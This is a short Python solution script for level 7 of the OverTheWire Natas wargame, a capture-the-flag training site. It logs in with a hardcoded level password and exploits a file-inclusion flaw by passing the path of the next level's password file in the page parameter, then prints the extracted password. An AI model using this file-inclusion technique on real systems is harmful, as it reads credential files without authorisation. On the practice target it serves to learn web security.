import requests
import re

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
url = f"http://{username}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"

session = requests.Session()

response = session.post(url, auth=(username, password))

content = response.text

flag = re.findall(r"<br>\n<br>\n(.*)\n", content)[0]

print(flag)